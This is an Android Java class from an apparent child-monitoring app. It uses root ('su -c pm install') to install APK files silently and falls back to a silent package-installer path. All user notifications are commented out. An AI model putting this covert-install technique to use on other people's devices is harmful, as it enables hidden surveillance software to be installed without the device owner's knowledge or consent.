package com.monitoring.child;

import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;
import java.io.File;

public class ApkSilentInstaller {
    private static final String TAG = "ApkSilentInstaller";

    public static void installWithRoot(Context context, File apkFile) {
        new Thread(() -> {
            try {
                if (!isDeviceRooted()) {
//                    showToast(context, "❌ Root নেই → PackageInstaller ব্যবহার করা হচ্ছে");
                    installWithPackageInstaller(context, apkFile);
                    return;
                }

                String cmd = "pm install -r -d --user 0 " + apkFile.getAbsolutePath();
                Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
                int result = process.waitFor();

                if (result == 0) {
//                    showToast(context, "✅ APK সফলভাবে ইনস্টল হয়েছে (Root System App)");
                    Log.i(TAG, "Root Silent Install Successful");
                } else {
//                    showToast(context, "❌ Root Install Failed → Fallback");
                    installWithPackageInstaller(context, apkFile);
                }
            } catch (Exception e) {
                Log.e(TAG, "Root install error", e);
//                showToast(context, "❌ Root Error → Normal Install");
                installWithPackageInstaller(context, apkFile);
            }
        }).start();
    }

    private static void installWithPackageInstaller(Context context, File apkFile) {
        Uri apkUri = Uri.fromFile(apkFile);
        if (context instanceof MainActivity) {
            ((MainActivity) context).installApkSilently(apkUri, null);
        } else {
//            showToast(context, "Install failed: Invalid context");
        }
    }

    private static boolean isDeviceRooted() {
        try {
            Process p = Runtime.getRuntime().exec("su -c id");
            return p.waitFor() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static void showToast(Context context, String msg) {
        new Handler(Looper.getMainLooper()).post(() ->
                Toast.makeText(context, msg, Toast.LENGTH_LONG).show());
    }
}